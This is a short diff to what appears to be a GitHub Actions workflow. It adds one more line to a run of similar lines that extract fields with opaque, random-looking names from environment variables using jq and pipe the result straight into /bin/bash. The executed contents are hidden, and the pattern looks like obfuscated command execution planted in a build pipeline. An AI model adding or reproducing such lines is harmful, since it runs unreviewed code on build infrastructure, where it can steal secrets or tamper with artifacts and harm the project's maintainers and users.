@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$sl32" | jq -r .nqw1 | /bin/bash
           echo $z308 | jq -r .ubnbs5824 | /bin/bash
           echo $zebcd00286 | jq -r .mp4940 | /bin/bash
+          echo $v28 | jq -r .jrj3000 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
